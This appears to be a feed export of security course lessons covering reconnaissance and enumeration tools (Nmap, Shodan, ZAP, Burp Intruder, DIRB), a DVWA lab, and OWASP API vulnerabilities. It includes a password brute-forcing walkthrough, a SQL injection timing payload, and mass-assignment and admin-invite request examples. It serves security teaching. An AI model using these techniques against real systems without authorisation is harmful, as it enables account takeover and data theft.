&lt;li>&lt;strong>scanning&lt;/strong> - manually or automatically (using tools) discovering vulnerabilities in the system, like SQL injection, XSS etc.&lt;/li>
&lt;li>&lt;strong>gaining access&lt;/strong> using enumeration - exploiting the vulnerabilities found before to collect sensitive information: usernames, machine names, network information, service settings&lt;/li>
&lt;li>&lt;strong>maintaining access&lt;/strong> - planting hidden programs (like Trojan horses) that make a future attack easier&lt;/li>
&lt;li>&lt;strong>covering tracks&lt;/strong> - cleaning up all the signs that may lead to thinking that an attack happened&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="./assets/pentest_phases.png" alt="Penetration testing phases">&lt;/p>
&lt;p>Next, we introduce some popular tools that may help in the first three phases, to gather information about a target.
Exploiting Tools/ Security Testing Tools/ Penetration Testing Tools are used for the discovery of vulnerabilities without attempting to actually exploit them.&lt;/p>
&lt;h1 id="1-reconnaissance">1. Reconnaissance&lt;/h1>
&lt;p>Reconnaissance is an important first stage in any ethical hacking attempt.
Before it is possible to exploit a vulnerability in the target system, it is necessary to find it.
By performing reconnaissance on the target, an ethical hacker can learn about the details of the target network and identify potential attack vectors.&lt;/p>
&lt;h2 id="nmap">Nmap&lt;/h2>
&lt;p>&lt;a href="https://insecure.org/">Nmap&lt;/a> is probably the most well-known tool for active &lt;strong>network&lt;/strong> reconnaissance.
It is a network scanner designed to determine details about a system and the programs running on it.&lt;/p>
&lt;p>Every computer has a total of 65535 available ports; however, many of these are registered as standard ports.
For example, a HTTP web service can nearly always be found on port 80 of the server.
A HTTPS web service can be found on port 443.
If we do not know which of these ports a server has open, then we do not have a hope of successfully attacking the target; thus, it is crucial that we begin any attack with a port scan.
Nmap can be used to perform many different kinds of port scan; the basic theory is this: it will connect to each port of the target in turn.
Depending on how the port responds, it can be determined as being &lt;em>open&lt;/em>, &lt;em>closed&lt;/em>, or &lt;em>filtered&lt;/em> (usually by a firewall).
Once we know which ports are open, we can then look at &lt;em>enumerating&lt;/em> which services are running on each port – either manually, or more commonly using nmap.&lt;/p>
&lt;p>Typing the simple command &lt;code>nmap&lt;/code> will display all of its options for scanning, while &lt;code>nmap &amp;lt;target&amp;gt;&lt;/code> will convert the hostname to an IP address and scan the top 1000 TCP ports, displaying their state and the service running on it:&lt;/p>
&lt;p>&lt;img src="./assets/nmap_output.png" alt="Nmap output">&lt;/p>
&lt;p>You can see the full example &lt;a href="https://nmap.org/book/port-scanning-tutorial.html">here&lt;/a> and practice more Nmap options &lt;a href="https://tryhackme.com/room/rpnmap">here&lt;/a>.&lt;/p>
&lt;h2 id="shodan">Shodan&lt;/h2>
&lt;p>&lt;a href="https://www.shodan.io/">Shodan&lt;/a> is a search engine similar to Google.
But while Google searches for websites, Shodan searches for devices that are connected to the internet - from routers and servers, to Internet of Things (IoT) devices, such as thermostats and baby monitors, to complex systems that govern a wide range of industries, including energy, power, and transportation.
You can use a variety of search filters: port, IP address, city etc.
If your internet-facing devices aren’t protected, Shodan can tell hackers everything they need to know to break into your network.&lt;/p>
&lt;h1 id="2-scanning">2. Scanning&lt;/h1>
&lt;h2 id="owasp-zap">OWASP Zap&lt;/h2>
&lt;p>The &lt;a href="https://owasp.org/">Open Web Application Security Project&lt;/a> (OWASP) is a nonprofit foundation that works to improve the security of software.
The &lt;a href="https://owasp.org/www-project-top-ten/">OWASP Top 10&lt;/a> is a standard awareness document for developers and web application security.
It represents a broad consensus about the most critical security risks to web applications and is updated every 3 years.&lt;/p>
&lt;p>Developed by OWASP, &lt;a href="https://www.zaproxy.org/">ZAP&lt;/a> or Zed Attack Proxy is a multi-platform, open source web application security testing tool. ZAP is used for finding a number of security vulnerabilities in a web app during the development as well as testing phase.
Other than its use as a scanner, ZAP can also be used to intercept a proxy for manually testing a web page.
ZAP can identify:&lt;/p>
&lt;ul>
&lt;li>Application error disclosure&lt;/li>
&lt;li>Cookie not marked with the HttpOnly flag&lt;/li>
&lt;li>Missing anti-CSRF tokens and security headers&lt;/li>
&lt;li>Private IP disclosure&lt;/li>
&lt;li>Session ID in URL rewrite&lt;/li>
&lt;li>SQL injection&lt;/li>
&lt;li>XSS injection&lt;/li>
&lt;/ul>
&lt;p>You can read about other active recon tools &lt;a href="https://resources.infosecinstitute.com/topic/top-10-network-recon-tools/#gref">here&lt;/a>: Nessus, OpenVAS, Nikto, Metasploit, &lt;a href="https://pentest-tools.com/website-vulnerability-scanning/website-scanner">Pentest-Tools Website Scanner&lt;/a>.&lt;/p>
&lt;h1 id="3-enumeration">3. Enumeration&lt;/h1>
&lt;h2 id="extracting-common-passwords---burp-intruder">Extracting common passwords - Burp Intruder&lt;/h2>
&lt;p>You were introduced to Burp Proxy in an earlier session.
Now we&amp;rsquo;ll see an example of how to use Intruder in order to enumerate passwords.
With Burp Intruder, customized attacks can be automated against web applications.
Customizing attacks requires that we specify one or more payloads and the position where the payloads will be placed in the website.&lt;/p>
&lt;ul>
&lt;li>I opened Burp and the built-in Chromium browser (or your browser of choice, but pay attention to setting up the proxy), having the intercept &lt;strong>off&lt;/strong>.&lt;/li>
&lt;li>I navigated to &lt;a href="https://sss-ctf.security.cs.pub.ro/home">https://sss-ctf.security.cs.pub.ro/home&lt;/a> and tried to log in using the email &lt;strong>&lt;a href="mailto:a@a.com">a@a.com&lt;/a>&lt;/strong> and the password &lt;strong>abc123&lt;/strong>.&lt;/li>
&lt;li>The POST request can be found in HTTP history. Right click on it to send it to Intruder.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/send_to_intruder.png" alt="Send request to Burp Intruder">&lt;/p>
&lt;ul>
&lt;li>Let&amp;rsquo;s say we want to try all the passwords from &lt;strong>abc1&lt;/strong>, &lt;strong>abc3&lt;/strong>, &lt;strong>abc5&lt;/strong>&amp;hellip; to &lt;strong>abc100&lt;/strong>. Navigate to the &lt;strong>Positions&lt;/strong> tab - the payload position is specified with a pair of these characters: &lt;strong>§&lt;/strong> called &lt;strong>payload markers&lt;/strong>.&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Note!&lt;/strong> By default, Burp surrounds by default some parameter values which might be candidates for enumeration, such as cookie values, or POST data values.
Remove the extra &lt;strong>§&lt;/strong> characters, leaving it like in the picture below.&lt;/p>
&lt;p>&lt;img src="./assets/payload_position.png" alt="Set payload position">&lt;/p>
&lt;ol>
&lt;li>Our payload type (wordlist) is a sequence of numbers which can be automatically generated in Burp. Go to the &lt;strong>Payloads&lt;/strong> tab and select &lt;strong>Numbers&lt;/strong> as the &lt;strong>Payload type&lt;/strong>.&lt;/li>
&lt;li>Fill in the Payload options to generate all the numbers from 1 to 100, with step 2 (1, 3, 5&amp;hellip;).&lt;/li>
&lt;li>Finally, launch the attack.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="./assets/payload_type.png" alt="Set payload type">&lt;/p>
&lt;p>A new window opens and you can see all the requests Burp is making, with the payloads you specified.
For example, you can check the request corresponding to the payload 7, with the resulting password being &lt;strong>abc7&lt;/strong>, and you can observe the response, its status code, or even open it in the browser.&lt;/p>
&lt;p>&lt;img src="./assets/attack_example.png" alt="Attack example">&lt;/p>
&lt;p>There are many ways in which you can customize this process according to your needs.
You can have multiple payload positions and select from four attack types, specifying how to insert the payloads (one different wordlist for each position, or combinations of them).
Find more details &lt;a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/positions">here&lt;/a>.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Sniper&lt;/strong> - This uses a single set of payloads.
It targets each payload position in turn, and places each payload into that position in turn.
Positions that are not targeted for a given request are not affected - the position markers are removed and any enclosed text that appears between them in the template remains unchanged.
This attack type is useful for fuzzing a number of request parameters individually for common vulnerabilities.
The total number of requests generated in the attack is the product of the number of positions and the number of payloads in the payload set.&lt;/li>
&lt;li>&lt;strong>Battering ram&lt;/strong> - This uses a single set of payloads.
It iterates through the payloads, and places the same payload into all of the defined payload positions at once.
This attack type is useful where an attack requires the same input to be inserted in multiple places within the request (e.g. a username within a Cookie and a body parameter).
The total number of requests generated in the attack is the number of payloads in the payload set.&lt;/li>
&lt;li>&lt;strong>Pitchfork&lt;/strong> - This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through all payload sets simultaneously, and places one payload into each defined position.
In other words, the first request will place the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second request will place the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc.
This attack type is useful where an attack requires different but related input to be inserted in multiple places within the request (e.g. a username in one parameter, and a known ID number corresponding to that username in another parameter).
The total number of requests generated in the attack is the number of payloads in the smallest payload set.&lt;/li>
&lt;li>&lt;strong>Cluster bomb&lt;/strong> - This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through each payload set in turn, so that all permutations of payload combinations are tested. I.e., if there are two payload positions, the attack will place the first payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1; it will then place the second payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1.
This attack type is useful where an attack requires different and unrelated or unknown input to be inserted in multiple places within the request (e.g. when guessing credentials, a username in one parameter, and a password in another parameter).
The total number of requests generated in the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.&lt;/li>
&lt;/ul>
&lt;p>There are also many different types of payloads you can use (&lt;a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types">here&lt;/a> is the entire list), from specifying your own list of words to generating random bytes.
You can find lists of popular credentials online, for instance, &lt;a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">here&lt;/a> is a repo with lists of most used passwords.&lt;/p>
&lt;h2 id="web-content-enumeration-web-content-discovery-dirbusting">Web Content Enumeration/ Web Content Discovery/ Dirbusting&lt;/h2>
&lt;p>Let&amp;rsquo;s say we have the target server &lt;strong>&lt;a href="https://security.cs.pub.ro/">https://security.cs.pub.ro/&lt;/a>&lt;/strong> and we want to discover hidden files, directories or other resources there.
Manually, we would make multiple requests like &lt;em>&lt;a href="https://security.cs.pub.ro/docs">https://security.cs.pub.ro/docs&lt;/a>&lt;/em>, &lt;em>&lt;a href="https://security.cs.pub.ro/config.php">https://security.cs.pub.ro/config.php&lt;/a>&lt;/em> etc. or whatever we imagine might find and see if we get a 404 Not Found response or not.
Luckily, there are command line tools and predefined wordlists in Kali (&lt;strong>/usr/share/wordlists/&lt;/strong>) doing exactly this for us.&lt;/p>
&lt;h3 id="dirb">DIRB&lt;/h3>
&lt;p>&lt;a href="https://tools.kali.org/web-applications/dirb">DIRB&lt;/a> is a Web Content Scanner, a Kali built in tool.
It looks for existing (and/or hidden) Web Objects.
It basically works by launching a dictionary based attack against a web server and analyzing the response.
DIRB comes with a set of preconfigured attack wordlists for easy usage but you can use your custom wordlists.
For each filename, it checks the existence on the web server and returns the results which do not give a 404 Not Found response.&lt;/p>
&lt;p>Usage example: &lt;code>./dirb &amp;lt;url_base&amp;gt; [&amp;lt;wordlist_file(s)&amp;gt;] [options]&lt;/code>&lt;/p>
&lt;p>&lt;img src="./assets/dirb_example.png" alt="DIRB example">&lt;/p>
&lt;p>The output lines with the results found (not 404) start with a &lt;code>+&lt;/code> and give details about status code and page size.&lt;/p>
&lt;p>You can read the documentation if you want to specify custom options, like custom file extensions to look for.&lt;/p>
&lt;h3 id="similar-tools">Similar tools&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://tools.kali.org/web-applications/dirbuster">DirBuster&lt;/a> - not maintained anymore, Kali built in, written in Java.
The only one with a GUI and not a CLI.&lt;/li>
&lt;li>&lt;a href="https://www.kali.org/tools/dirsearch/">DirSearch&lt;/a> - Kali built in &amp;amp; on &lt;a href="(https://github.com/maurosoria/dirsearch)">GitHub&lt;/a>, written in Python.&lt;/li>
&lt;li>&lt;a href="https://tools.kali.org/web-applications/gobuster">GoBuster&lt;/a> - Kali built in &amp;amp; on &lt;a href="https://github.com/OJ/gobuster">GitHub&lt;/a>, written in Go.
Can do DNS and VHost busting, S3 buckets enumeration.&lt;/li>
&lt;li>&lt;a href="https://github.com/xmendez/wfuzz">wfuzz&lt;/a> - on GitHub, written in Python, can be easily installed with pip.&lt;/li>
&lt;li>&lt;a href="https://github.com/ffuf/ffuf">ffuf&lt;/a> - on GitHub, written in Go, has the option to mutate the files found.
Can do VHost discovery.&lt;/li>
&lt;/ul>
&lt;p>You can find a detailed comparison &lt;a href="https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/">here&lt;/a>.
We don&amp;rsquo;t recommend DirBuster and DirSearch since the others are newer, improved and better-maintained tools.
DIRB is also not maintained anymore, but can come in handy if you want to do a quick content discovery, with not many options to configure.&lt;/p>
&lt;h2 id="recap-with-dvwa">Recap with DVWA&lt;/h2>
&lt;p>DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable application which you can use to test your skills and exploit some of the most common web vulnerabilities, like XSS, SQL, LFI, with various difficulty levels.&lt;/p>
&lt;h3 id="setup-instructions">Setup instructions&lt;/h3>
&lt;p>An easy way to deploy DVWA is by using &lt;a href="https://docs.docker.com/get-docker/">Docker&lt;/a>, which you need to have installed on your machine.
Then, follow the instructions from &lt;a href="https://hub.docker.com/r/vulnerables/web-dvwa/">here&lt;/a>.
After running it, you can simply access it in your browser at http://127.0.0.1:80 (or a different port, if you wish), login and start hacking.&lt;/p>
&lt;h3 id="solutions">Solutions&lt;/h3>
&lt;ul>
&lt;li>Brute force: &lt;a href="https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d">https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d&lt;/a>&lt;/li>
&lt;li>SQL Injection: &lt;a href="https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d">https://medium.com/cyberdefendersprogram/burp-suite-webpage-enumeration-and-vulnerability-testing-cfd0b140570d&lt;/a>&lt;/li>
&lt;li>Blind Sql: &lt;a href="https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7">https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7&lt;/a>&lt;/li>
&lt;li>CSRF: &lt;a href="https://medium.com/hacker-toolbelt/dvwa-1-9-iv-csrf-b9f2409fd628">https://medium.com/hacker-toolbelt/dvwa-1-9-iv-csrf-b9f2409fd628&lt;/a>&lt;/li>
&lt;li>File Upload: &lt;a href="https://medium.com/hacker-toolbelt/dvwa-1-9-vi-file-upload-ce77a73b0453">https://medium.com/hacker-toolbelt/dvwa-1-9-vi-file-upload-ce77a73b0453&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://www.safetydetectives.com/blog/what-is-shodan-and-how-to-use-it-most-effectively/">https://www.safetydetectives.com/blog/what-is-shodan-and-how-to-use-it-most-effectively/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackr.io/blog/top-10-open-source-security-testing-tools-for-web-applications">https://hackr.io/blog/top-10-open-source-security-testing-tools-for-web-applications&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.knowledgehut.com/blog/security/enumeration-in-ethical-hacking">https://www.knowledgehut.com/blog/security/enumeration-in-ethical-hacking&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.greycampus.com/opencampus/ethical-hacking/enumeration-and-its-types">https://www.greycampus.com/opencampus/ethical-hacking/enumeration-and-its-types&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="wordlists">Wordlists&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/Bo0oM/fuzz.txt">https://github.com/Bo0oM/fuzz.txt&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/aels/subdirectories-discover">https://github.com/aels/subdirectories-discover&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="bug-bounty-program-lists">Bug Bounty Program Lists&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/projectdiscovery/public-bugbounty-programs/blob/master/chaos-bugbounty-list.json">https://github.com/projectdiscovery/public-bugbounty-programs/blob/master/chaos-bugbounty-list.json&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.bugcrowd.com/bug-bounty-list/">https://www.bugcrowd.com/bug-bounty-list/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackerone.com/bug-bounty-programs">https://hackerone.com/bug-bounty-programs&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;ol>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/268a2910-02d8-11ed-9675-abf36c35783f">Not So Random&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sss-web.cyberedu.ro/challenge/7ba65330-02d8-11ed-9270-29119375f24f">Lamer Login&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hub.docker.com/r/vulnerables/web-dvwa/">DVWA&lt;/a>&lt;/li>
&lt;/ol></description></item><item><title>Essentials:</title><link>/essentials/data-security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/data-security/</guid><description>
&lt;h1 id="data-security">Data Security&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;p>Use &lt;a href="https://github.com/ekalinin/github-markdown-toc">gh-md-toc&lt;/a>.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Objectives and rationale for the current session.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;ul>
&lt;li>Information required for this section&lt;/li>
&lt;li>Commands / snippets that should be known, useful to copy-paste throughout the practical session&lt;/li>
&lt;/ul>
&lt;h2 id="content-sections">Content Sections:&lt;/h2>
&lt;ul>
&lt;li>Content split in sections, according to session specifics&lt;/li>
&lt;li>Demos will be part of the session presentation and will be referenced (snippets, images, links) in the content&lt;/li>
&lt;/ul>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;ul>
&lt;li>Sumamrizing session concepts&lt;/li>
&lt;li>Summarizing commands / snippets that are useful for tutorials, challenges (easy reference, copy-paste)&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;p>Tasks for the students to solve. They may be of two types:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Tutorials&lt;/strong> - simpler tasks accompanied by more detailed, walkthrough-like explanations&lt;/li>
&lt;li>&lt;strong>Challenges&lt;/strong> - the good stuff&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;p>Any links or references to extra information.&lt;/p></description></item><item><title>Web:</title><link>/web/framework-api-vulnerabilities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/framework-api-vulnerabilities/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>Application programming interfaces (APIs) and frameworks have become a critical part of almost every business.
APIs are responsible for transferring information between systems within a company or to external companies.
API may be a system API or a library API.
Here we talk about web APIs, i.e. APIs provided by web applications.
APIs are means through which a client accesses remote services.
For example, when you log in to a website like Google or Facebook, an API processes your login credentials to verify they are correct.
A framework, or software framework, is a platform for developing software applications.
It provides a foundation on which software developers can build programs for a specific platform.
For example, a framework may include predefined classes and functions that can be used to process input, manage hardware devices, and interact with system software.&lt;/p>
&lt;p>However, given the sensitive data being transferred through APIs, it’s critical to secure them.
Moreover, from time to time people find vulnerabilities for versions of widely used frameworks, which puts numerous web apps at risk.
Therefore, it&amp;rsquo;s best to be up to date and apply security patches as soon as a new vulnerability arises.&lt;/p>
&lt;h1 id="api-vulnerabilities">API Vulnerabilities&lt;/h1>
&lt;p>By nature, APIs expose application logic and sensitive data such as Personally Identifiable Information (PII) and because of this have increasingly become a target for attackers.
PII is any data that could potentially be used to identify a particular person.
Examples include a full name, Social Security number, driver&amp;rsquo;s license number, bank account number, passport number, and email address.&lt;/p>
&lt;h2 id="broken-object-level-authorization">Broken Object Level Authorization&lt;/h2>
&lt;p>An object refers to a data source that is associated with an authenticated entity.
Object-level authorization is all about controlling access based on the scope of permissible user data and object access.
A simple physical world example is a hotel room key which is coded to only open the room you paid for, as opposed to a master key used by a maid that opens all the rooms on the floor.
Attackers can exploit API endpoints that are vulnerable to broken object level authorization by manipulating the ID of an object that is sent within the client request.
What this means is that the client can request information from an API endpoint that they are not supposed to have access to.
This attack normally leads to unauthorized information disclosure, modification, or destruction of data.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Say for instance there is an e-commerce platform that provides financial and hosted services to a group of different online stores (shops).
The platform provides an API used to gain access to revenue charts for each of their hosted stores, and each store should only have access to their own revenue charts.
However, while inspecting the client request from a single store that wants to gain access to their own revenue charts, an attacker can identify (find) the API endpoint for those revenue charts and identify the URL in use, for example &lt;code>/shops/{shop name}/revenue_data.json&lt;/code>.
Using the names of other stores being hosted on the e-commerce platform, an attacker can create a simple script to modify the &lt;code>{shop name}&lt;/code> ID object in subsequent requests, and gain access to the revenue charts of every other store.&lt;/p>
&lt;h2 id="broken-authentication">Broken Authentication&lt;/h2>
&lt;p>Being different from Authorization discussed above, Authentication on the other hand is a complex and confusing mechanism concerning APIs.
Since authentication endpoints are exposed to anyone by design, the endpoints that are responsible for user-authentication must be treated differently from regular API endpoints and implement extra layers of protection for credential stuffing attempts, in addition to brute force password and token guessing attacks.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Suppose that an attacker obtained a list of leaked username/password combinations as the result of a data breach from another organization.
If the API endpoint handling authentication does not implement brute force or credential stuffing protections like CAPTCHA, rate-limiting, account lockout, etc., an attacker can repeatedly attempt to gain access using the list of username/password combinations to determine what combination(s) work.&lt;/p>
&lt;h2 id="excessive-data-exposure">Excessive Data Exposure&lt;/h2>
&lt;p>By design, API endpoints often expose sensitive data since they frequently rely on the client app to perform data filtering.
Attackers exploit this issue by sniffing the traffic to analyze the responses, looking for sensitive data that should not be exposed.
This data is supposed to be filtered on the client app, before being presented to the user.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Imagine that an IoT-based camera surveillance system allows administrators to add a newly-hired security guard as a system user, and the administrator wants to ensure the new user should only have access to certain cameras.
These cameras are accessible via a mobile app that the security guard uses while at work.
The newly hired security guard’s mobile app makes an API request to an endpoint in order to receive data about the cameras, and relies on the mobile app to filter which cameras the guard has access to.
Although the mobile app only shows the cameras the guard can access, the actual API response contains a full list of all the cameras.
Using the sniffed traffic, an attacker can manipulate the API request to show all cameras, bypassing the filtering on the mobile app.&lt;/p>
&lt;h2 id="lack-of-resources--rate-limiting">Lack of Resources &amp;amp; Rate Limiting&lt;/h2>
&lt;p>It is common to find API endpoints that do not implement any sort of rate limiting on the number of API requests, or they do not limit the type of requests that can consume considerable network, CPU, memory, and storage resources.
The amount of resources required to satisfy a request greatly depends on the user input and endpoint business logic.
Attackers exploit these issues causing denial-of-service attacks and associated endpoint outages.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Let’s say that an attacker wants to cause a denial-of-service outage to a certain API that contains a very large list of users.
The users’ list can be queried, but the application limits the number of users that can be displayed to 100 users.
A normal request to the application would look like this: &lt;code>/api/users?page=1&amp;amp;size=100&lt;/code>.
In this case, the request would return with the first page and the first 100 users.
If the attacker changed the size parameter from 100 to 200000, it could cause a performance issue on the backend database, since the size parameter in use is so large.
As a result, the API becomes unresponsive and is unable to handle further requests from this or any other client.&lt;/p>
&lt;h2 id="broken-function-level-authorization">Broken Function Level Authorization&lt;/h2>
&lt;p>Although different from Broken Object Level Authorization (described above), exploitation of this issue requires the attacker to send API requests to endpoints that they should not have access to, yet are exposed to anonymous users or regular, non-privileged users.
These types of flaws are often easy to find and can allow attackers to access unauthorized functionality.
For example, administrative functions are prime targets for this type of attack.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>To illustrate this further, imagine that during the registration process to a certain application that only allows invited users to join, the mobile app triggers an API request to GET /api/invites/{invite_guid}.
GET is a standard HTTP method used to request information from a particular resource.
In this case, the response to the GET contains details about the invite, including the user’s role and email address.&lt;/p>
&lt;p>Now, say that an attacker duplicated the request and manipulated the HTTP method by changing GET to POST.
POST is a HTTP method used to send information to create or update a resource.
The URL would look like this: &lt;code>POST /api/invites/new/{“email”:”hugo@malicious.com”,”role”:”admin”}&lt;/code>.
In this case, the attacker easily exploits this issue and sends himself an email invite to create an admin account.&lt;/p>
&lt;h2 id="mass-assignment">Mass Assignment&lt;/h2>
&lt;p>Modern frameworks encourage developers to use functions that automatically bind input from the client into code variables and internal objects.
What this means is that users should have the ability to update their username, contact details, etc. (within their profiles for example), but they should not be able to change their user-level permissions, adjust account balances, and other administrative-like functions.
An API endpoint is considered vulnerable if it automatically converts the client input into internal object properties, without considering the sensitivity and the exposure level of these properties.
This could allow an attacker to update things that they should not have access to.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>To illustrate this further, imagine that a ride sharing application provides the user the option to edit basic information about themselves in their user profile.
For example, they can adjust their username, age etc.
In this case, the API request would look like this: &lt;code>PUT /api/v1/users/me&lt;/code> with the following legitimate information:&lt;/p>
&lt;p>&lt;code>{&amp;quot;username&amp;quot;:&amp;quot;john&amp;quot;,&amp;quot;age&amp;quot;:24}&lt;/code>&lt;/p>
&lt;p>However, the attacker determines that the request &lt;code>GET /api/v1/users/me&lt;/code> includes an additional credit_balance property (field) as shown below.&lt;/p>
&lt;p>&lt;code>{&amp;quot;username&amp;quot;:&amp;quot;john&amp;quot;,&amp;quot;age&amp;quot;:24,&amp;quot;credit_balance&amp;quot;:10}&lt;/code>&lt;/p>
&lt;p>The attacker desires to increase their credit balance on their own and replays the first request with the following payload:&lt;/p>
&lt;p>&lt;code>{&amp;quot;username&amp;quot;:&amp;quot;john&amp;quot;,&amp;quot;age&amp;quot;:24,&amp;quot;credit_balance&amp;quot;:99999}&lt;/code>&lt;/p>
&lt;p>Since the endpoint is vulnerable to mass assignment, the attacker can easily adjust their own &lt;code>credit_balance&lt;/code> at will, for example changing it from 10 credits to 99999 as shown above.&lt;/p>
&lt;h2 id="security-misconfiguration">Security Misconfiguration&lt;/h2>
&lt;p>Attackers will often attempt to find unpatched flaws, common endpoints, or unprotected files and directories to gain unauthorized access or knowledge of the system they want to attack.
Security misconfigurations can not only expose sensitive user data, but also system details that may lead to full server compromise.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Say for instance that an attacker uses a popular search engine like Shodan to search for computers and devices directly accessible from the Internet.
The attacker found a server running a popular database management system, listening on the default TCP port.
The database management system was using the default configuration, which has authentication disabled by default, and the attacker gained access to millions of records with PII, personal preferences, and authentication data.&lt;/p>
&lt;h2 id="injection">Injection&lt;/h2>
&lt;p>Injection flaws, such as SQL, NoSQL, command injection, etc., occur when untrusted data is sent to an interpreter as part of a command or query.
Injection vulnerabilities cause computing systems to potentially process malicious data that attackers introduce.
To put it in its simplest terms, attackers inject code into a vulnerable piece of software and change the way the software is intended to be executed.
As a result, injection attacks can be somewhat disastrous, since they normally lead to data theft, data loss, data corruption, denial of service, etc.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Suppose an attacker starts inspecting the network traffic of their web browser and identifies the following API request designed to help a user recover their password.
The attacker identifies the request responsible to start the recovery-password process as follows:&lt;/p>
&lt;p>&lt;code>POST /api/accounts/recovery {“email”: “john@somehost.com”}&lt;/code>&lt;/p>
&lt;p>Then the attacker replays the request with a different payload:&lt;/p>
&lt;p>&lt;code>POST /api/account/recovery {“email”: “john@somehost.com’;WAITFOR DELAY ‘0:0:5’–“}&lt;/code>&lt;/p>
&lt;p>By adding the &lt;code>;WAITFOR DELAY ‘0:0:5’–”&lt;/code> the attacker observes that the response from the API took ~5 seconds longer, which helps confirm the API is vulnerable to SQL injection.
Exploiting the injection vulnerability, the attacker was able to gain unauthorized access to the system.&lt;/p>
&lt;h2 id="improper-assets-management">Improper Assets Management&lt;/h2>
&lt;p>Old API versions are often unpatched and can become an easy way to compromise systems without having to fight state-of-the-art security systems, which might be in place to protect the most recent API versions.
Attackers may gain access to sensitive data, or even take over the server through old, unpatched API versions connected to the same database.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Say for instance that an organization redesigning their applications forgot about an old API version (api.someservice.com/v1) and left it unprotected, and with access to the user database.
While targeting one of the latest released applications, an attacker found the API address (api.someservice.com/v2).
Replacing v2 with v1 in the URL gave the attacker access to the old, unprotected API, exposing the personal identifiable information (PII) of millions of users.&lt;/p>
&lt;h2 id="insufficient-logging--monitoring">Insufficient Logging &amp;amp; Monitoring&lt;/h2>
&lt;p>Without logging and monitoring, or with insufficient logging and monitoring, it is almost impossible to track suspicious activities targeting APIs and respond to them in a timely fashion.
Without visibility over ongoing malicious activities, attackers have plenty of time to potentially compromise systems and steal data.
Most breach studies demonstrate the time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.&lt;/p>
&lt;p>&lt;strong>Example Attack Scenario:&lt;/strong>&lt;/p>
&lt;p>Imagine that a video-sharing platform was hit by a &amp;ldquo;large-scale&amp;rdquo; credential stuffing attack.
Despite failed logins being logged, no alerts were triggered during the timespan of the attack, and it proceeded without being noticed.
As a reaction to user complaints about a possible breach, API logs were analyzed and the attack was detected, way after the fact.
